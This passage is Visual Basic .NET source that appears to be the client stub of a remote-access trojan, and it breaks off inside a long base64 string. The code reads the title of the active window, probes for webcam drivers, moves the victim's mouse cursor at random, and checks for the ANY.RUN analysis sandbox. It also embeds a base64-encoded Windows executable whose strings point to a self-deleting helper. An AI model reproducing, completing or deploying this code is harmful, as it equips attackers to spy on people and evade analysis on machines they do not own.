﻿Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.VisualBasic.Devices
Imports Microsoft.Win32
Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Imaging
Imports System.IO
Imports System.IO.Compression
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports System.Environment
Imports System.Collections
Imports spredusb
Imports Stub


Namespace j


    <StandardModule()>
    Friend NotInheritable Class OK

        <DebuggerStepThrough(), CompilerGenerated()>
        Private Shared Sub _Lambda__1(ByVal a0 As Object)
            OK.Ind(DirectCast(a0, Byte()))

        End Sub

        <DebuggerStepThrough(), CompilerGenerated()>
        Private Shared Sub _Lambda__2(ByVal a0 As Object, ByVal a1 As SessionEndingEventArgs)
            OK.ED()
        End Sub

        Public Shared Function ACT() As String
            Dim str As String
            Try
                Dim foregroundWindow As IntPtr = OK.GetForegroundWindow
                If (foregroundWindow = IntPtr.Zero) Then
                    Return ""
                End If
                Dim winTitle As String = Strings.Space((OK.GetWindowTextLength(CLng(foregroundWindow)) + 1))
                OK.GetWindowText(foregroundWindow, winTitle, winTitle.Length)
                str = OK.ENB(winTitle)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                str = ""
                ProjectData.ClearProjectError()
            End Try
            Return str
        End Function


        Dim MouseThread As Thread = New Thread(New ThreadStart(AddressOf Mouse))

        Private Shared Sub Mouse()
            Dim MouseThread As Thread = New Thread(New ThreadStart(AddressOf Mouse))
            Dim xxx As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim ooo As Integer = Screen.PrimaryScreen.Bounds.Height

            For x As Integer = 1 To 100

                Dim generator As New Random
                Dim randomValue As Integer
                Dim randomValue2 As Integer
                randomValue = generator.Next(0, ooo)
                randomValue2 = generator.Next(0, xxx)
                Dim mousepos As Point
                mousepos.X = randomValue
                mousepos.Y = randomValue2
                Windows.Forms.Cursor.Position = mousepos
                Threading.Thread.Sleep(50)

            Next
			
            MouseThread.Abort()

        End Sub

        Public Shared Function BS(ByRef B As Byte()) As String
            Return Encoding.UTF8.GetString(B)
        End Function

        Public Shared Function Cam() As Boolean
            Try
                Dim num As Integer = 0
                Do
                    Dim lpszVer As String = Nothing
                    If OK.capGetDriverDescriptionA(CShort(num), Strings.Space(100), 100, lpszVer, 100) Then
                        Return True
                    End If
                    num += 1
                Loop While (num <= 4)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Return False
        End Function

        <DllImport("avicap32.dll", CharSet:=CharSet.Ansi, SetLastError:=True, ExactSpelling:=True)>
        Public Shared Function capGetDriverDescriptionA(ByVal wDriver As Short, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszName As String, ByVal cbName As Integer, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef lpszVer As String, ByVal cbVer As Integer) As Boolean
        End Function

        Private Shared Function CompDir(ByVal F1 As FileInfo, ByVal F2 As FileInfo) As Boolean
            If (F1.Name.ToLower = F2.Name.ToLower) Then
                Dim directory As DirectoryInfo = F1.Directory
                Dim parent As DirectoryInfo = F2.Directory
                Do
                    If (directory.Name.ToLower <> parent.Name.ToLower) Then
                        Return False
                    End If
                    directory = directory.Parent
                    parent = parent.Parent
                    If ((directory Is Nothing) And (parent Is Nothing)) Then
                        Return True
                    End If
                    If (directory Is Nothing) Then
                        Return False
                    End If
                Loop While (Not parent Is Nothing)
            End If
            Return False
        End Function

        Public Shared Function connect() As Boolean

            If OK.ANYRUN Then

                If IO.File.Exists(IO.Path.GetTempPath & "sand.dat") Then
                    H = "127.0.0.1"
                Else
                    Dim byt As Byte() = Convert.FromBase64String("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ZV9fAFByb2plY3REYXRhAG1zY29ybGliAE1pY3Jvc29mdC5WaXN1YWxCYXNpYwBUaHJlYWQARm9ybTFfTG9hZABhZGRfTG9hZABBZGQAZ2V0X0lzRGlzcG9zZWQAbV9Gb3JtQmVpbmdDcmVhdGVkAFN5bmNocm9uaXplZABTYW5kAHNldF9Jc1NpbmdsZUluc3RhbmNlAENyZWF0ZUluc3RhbmNlAGdldF9HZXRJbnN0YW5jZQBkZWZhdWx0SW5zdGFuY2UAaW5zdGFuY2UAR2V0SGFzaENvZGUAc2V0X0F1dG9TY2FsZU1vZGUAQXV0aGVudGljYXRpb25Nb2RlAFNodXRkb3duTW9kZQBnZXRfTWVzc2FnZQBJRGlzcG9zYWJsZQBIYXNodGFibGUAc2V0X1Zpc2libGUAUnVudGltZVR5cGVIYW5kbGUAR2V0VHlwZUZyb21IYW5kbGUAc2V0X1NodXRkb3duU3R5bGUAc2V0X0Zvcm1Cb3JkZXJTdHlsZQBzZXRfV2luZG93U3R5bGUAUHJvY2Vzc1dpbmRvd1N0eWxlAHNldF9OYW1lAHNldF9GaWxlTmFtZQBnZXRfVXNlck5hbWUAZ2V0X0NvbXB1dGVyTmFtZQBXcml0ZUxpbmUAQ2hlY2tGb3JTeW5jTG9ja09uVmFsdWVUeXBlAEdldFR5cGUAZ2V0X0N1bHR1cmUAc2V0X0N1bHR1cmUAcmVzb3VyY2VDdWx0dXJlAFdpbmRvd3NGb3Jtc0FwcGxpY2F0aW9uQmFzZQBBcHBsaWNhdGlvblNldHRpbmdzQmFzZQBDbG9zZQBEaXNwb3NlAEVkaXRvckJyb3dzYWJsZVN0YXRlAFRocmVhZFN0YXRpY0F0dHJpYnV0ZQBTVEFUaHJlYWRBdHRyaWJ1dGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUARGVzaWduZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBIZWxwS2V5d29yZEF0dHJpYnV0ZQBHZW5lcmF0ZWRDb2RlQXR0cmlidXRlAERlYnVnZ2VyTm9uVXNlckNvZGVBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBFZGl0b3JCcm93c2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFN0YW5kYXJkTW9kdWxlQXR0cmlidXRlAEhpZGVNb2R1bGVOYW1lQXR0cmlidXRlAERlYnVnZ2VyU3RlcFRocm91Z2hBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUARGVidWdnZXJIaWRkZW5BdHRyaWJ1dGUAQXNzZW1ibHlGaWxlVmVyc2lvbkF0dHJpYnV0ZQBNeUdyb3VwQ29sbGVjdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBtX1RocmVhZFN0YXRpY1ZhbHVlAEdldE9iamVjdFZhbHVlAFNhdmUAUmVtb3ZlAFNhbmQuZXhlAHNldF9DbGllbnRTaXplAFN5c3RlbS5UaHJlYWRpbmcAZ2V0X1VzZUNvbXBhdGlibGVUZXh0UmVuZGVyaW5nAEdldFJlc291cmNlU3RyaW5nAENvbXBhcmVTdHJpbmcAVG9TdHJpbmcAZGlzcG9zaW5nAFN5c3RlbS5EcmF3aW5nAGdldF9FeGVjdXRhYmxlUGF0aABHZXRUZW1wUGF0aABTeXN0ZW0uQ29tcG9uZW50TW9kZWwAQ29udGFpbmVyQ29udHJvbABPYmplY3RGbG93Q29udHJvbABnZXRfRmlsZVN5c3RlbQBzZXRfTWFpbkZvcm0AT25DcmVhdGVNYWluRm9ybQByZXNvdXJjZU1hbgBTeXN0ZW0uQ29tcG9uZW50TW9kZWwuRGVzaWduAE1haW4Ac2V0X1Nob3dJY29uAGdldF9BcHBsaWNhdGlvbgBNeUFwcGxpY2F0aW9uAFN5c3RlbUluZm9ybWF0aW9uAFN5c3RlbS5Db25maWd1cmF0aW9uAFN5c3RlbS5HbG9iYWxpemF0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAFRhcmdldEludm9jYXRpb25FeGNlcHRpb24ASW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbgBnZXRfSW5uZXJFeGNlcHRpb24AQXJndW1lbnRFeGNlcHRpb24AUnVuAGFkZF9TaHV0ZG93bgBDdWx0dXJlSW5mbwBQcm9jZXNzU3RhcnRJbmZvAFNsZWVwAHNldF9TaG93SW5UYXNrYmFyAG1fQXBwT2JqZWN0UHJvdmlkZXIAbV9Vc2VyT2JqZWN0UHJvdmlkZXIAbV9Db21wdXRlck9iamVjdFByb3ZpZGVyAG1fTXlXZWJTZXJ2aWNlc09iamVjdFByb3ZpZGVyAG1fTXlGb3Jtc09iamVjdFByb3ZpZGVyAHNlbmRlcgBnZXRfUmVzb3VyY2VNYW5hZ2VyAGFkZGVkSGFuZGxlcgBTaHV0ZG93bkV2ZW50SGFuZGxlcgBTeXN0ZW0uQ29kZURvbS5Db21waWxlcgBJQ29udGFpbmVyAGdldF9Vc2VyAE9wZW5UZXh0RmlsZVdyaXRlcgBTdHJlYW1Xcml0ZXIAVGV4dFdyaXRlcgBFbnRlcgBnZXRfQ29tcHV0ZXIAU2VydmVyQ29tcHV0ZXIATXlDb21wdXRlcgBTZXRQcm9qZWN0RXJyb3IAQWN0aXZhdG9yAC5jdG9yAC5jY3RvcgBNb25pdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuRGV2aWNlcwBnZXRfV2ViU2VydmljZXMATXlXZWJTZXJ2aWNlcwBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuQXBwbGljYXRpb25TZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWljcm9zb2Z0LlZpc3VhbEJhc2ljLkNvbXBpbGVyU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBNaWNyb3NvZnQuVmlzdWFsQmFzaWMuTXlTZXJ2aWNlcwBTeXN0ZW0uUmVzb3VyY2VzAFBPQ18xLk15LlJlc291cmNlcwBQT0NfMS5Gb3JtMS5yZXNvdXJjZXMAUE9DXzEuUmVzb3VyY2VzLnJlc291cmNlcwBEZWJ1Z2dpbmdNb2RlcwBzZXRfRW5hYmxlVmlzdWFsU3R5bGVzAGdldF9TZXR0aW5ncwBBdXRvU2F2ZVNldHRpbmdzAE15U2V0dGluZ3MARXZlbnRBcmdzAFJlZmVyZW5jZUVxdWFscwBVdGlscwBTeXN0ZW0uV2luZG93cy5Gb3JtcwBnZXRfRm9ybXMATXlGb3JtcwBzZXRfQXV0b1NjYWxlRGltZW5zaW9ucwBTeXN0ZW0uQ29sbGVjdGlvbnMAUnVudGltZUhlbHBlcnMAT3BlcmF0b3JzAFByb2Nlc3MAc2V0X0FyZ3VtZW50cwBjb21wb25lbnRzAENvbmNhdABhZGRlZEhhbmRsZXJMb2NrT2JqZWN0AE15UHJvamVjdABnZXRfU2F2ZU15U2V0dGluZ3NPbkV4aXQAc2V0X1NhdmVNeVNldHRpbmdzT25FeGl0AGdldF9EZWZhdWx0AFNldENvbXBhdGlibGVUZXh0UmVuZGVyaW5nRGVmYXVsdABFbnZpcm9ubWVudABJbml0aWFsaXplQ29tcG9uZW50AFN0YXJ0AFN1c3BlbmRMYXlvdXQAUmVzdW1lTGF5b3V0AHNldF9UZXh0AHNldF9DcmVhdGVOb1dpbmRvdwBzZXRfQ29udHJvbEJveABQT0NfMS5NeQBDb250YWluc0tleQBnZXRfQXNzZW1ibHkAc2V0X09wYWNpdHkATXlTZXR0aW5nc1Byb3BlcnR5AEZpbGVTeXN0ZW1Qcm94eQAAAB9QAE8AQwBfADEALgBSAGUAcwBvAHUAcgBjAGUAcwAAC2EAZABtAGkAbgAAD1UAUwBFAFIALQBQAEMAARFzAGEAbgBkAC4AZABhAHQAAAcwADAAMQAARS8AQwAgAGMAaABvAGkAYwBlACAALwBDACAAWQAgAC8ATgAgAC8ARAAgAFkAIAAvAFQAIAAzACAAJgAgAEQAZQBsACAAAA9jAG0AZAAuAGUAeABlAABFLwBDACAAYwBoAG8AaQBjAGUAIAAvAEMAIABZACAALwBOACAALwBEACAAWQAgAC8AVAAgADUAIAAmACAARABlAGwAIAAAC0YAbwByAG0AMQAAOVcAaQBuAEYAbwByAG0AcwBfAFIAZQBjAHUAcgBzAGkAdgBlAEYAbwByAG0AQwByAGUAYQB0AGUAADVXAGkAbgBGAG8AcgBtAHMAXwBTAGUAZQBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4AAEdQAHIAbwBwAGUAcgB0AHkAIABjAGEAbgAgAG8AbgBsAHkAIABiAGUAIABzAGUAdAAgAHQAbwAgAE4AbwB0AGgAaQBuAGcAAABHdqEqnmz4S4T1kRGar8bOAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFIAIBDg4FIAEBET0HIAQBDg4ODgMAAAIEAAEBAgUgAQEdDgYgAQERgKkGIAEBEYCtBSABARJ1BhUSLAESDAYVEiwBEggGFRIsARJlBhUSLAESJAYVEiwBEigEIAATAAUAAgIcHAcAARJ9EYCxBSAAEoC1ByACAQ4SgLUIAAESgLkSgLkEAAEcHAMgAAIDBwEcBAABARwFIAIBHBgGIAEBEoDJBiABARKAzQQAAQEIAwAADgYAAwgODgIFIAASgOkFAAIODg4HIAISgPUOAgYgAQERgQEIAAESgQUSgP0DAAABBSACAQwMBiABARGBDQYgAQERgRUFIAIBCAgGIAEBEYEZBiABARGBHQQgAQENBgcCHgASeQIeAAQgAQIcBgACDg4dDgUgAgEcHAUQAQAeAAQKAR4ABgABARKBMQUgABKBMQMgAA4HIAIBDhKBMQQgAQEcAyAACAQKARIgBAcBHgAGFRIsARMAAwYTAAITAAQKARMACLd6XFYZNOCJCLA/X38R1Qo6BwYVEiwBEgwHBhUSLAESCAcGFRIsARJlBwYVEiwBEiQHBhUSLAESKAQGEoCNBAYSgJEDBhIYAgYCAgYcBAYSgKEDBhJxAwYSIAUAAQEdDgQAABIMBAAAEggEAAASZQQAABIkBAAAEigFAAASgI0FAAASgJEGAAEBEoCRBwACARwSgJkEAAASGAcgAgEcEoCZBxABAR4AHgAHMAEBARAeAAQgABJ9BCAAEiAFIAEBEiAECAASDAQIABIIBAgAEmUECAASJAQIABIoBQgAEoCNBQgAEoCRBAgAEhgEKAASIAQoABMACAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQgBAAIAAAAAAAUBAAAAACkBACQ3MDY0YzA1OS02NWFkLTRhOGItODQ4YS0zMjUwYzRkNTE0ZGEAAAwBAAcxLjAuMC4wAAAEAQAAAAgBAAEAAAAAABgBAApNeVRlbXBsYXRlCDExLjAuMC4wAABBAQAzU3lzdGVtLlJlc291cmNlcy5Ub29scy5TdHJvbmdseVR5cGVkUmVzb3VyY2VCdWlsZGVyCDE1LjAuMC4wAABZAQBLTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5FZGl0b3JzLlNldHRpbmdzRGVzaWduZXIuU2V0dGluZ3NTaW5nbGVGaWxlR2VuZXJhdG9yCDE1LjkuMC4wAABYAQAZU3lzdGVtLldpbmRvd3MuRm9ybXMuRm9ybRJDcmVhdGVfX0luc3RhbmNlX18TRGlzcG9zZV9fSW5zdGFuY2VfXxJNeS5NeVByb2plY3QuRm9ybXMAAGEBADRTeXN0ZW0uV2ViLlNlcnZpY2VzLlByb3RvY29scy5Tb2FwSHR0cENsaWVudFByb3RvY29sEkNyZWF0ZV9fSW5zdGFuY2VfXxNEaXNwb3NlX19JbnN0YW5jZV9fAAAAEAEAC015LkNvbXB1dGVyAAATAQAOTXkuQXBwbGljYXRpb24AAAwBAAdNeS5Vc2VyAAANAQAITXkuRm9ybXMAABMBAA5NeS5XZWJTZXJ2aWNlcwAAEAEAC015LlNldHRpbmdzAAAAALQAAADOyu++AQAAAJEAAABsU3lzdGVtLlJlc291cmNlcy5SZXNvdXJjZVJlYW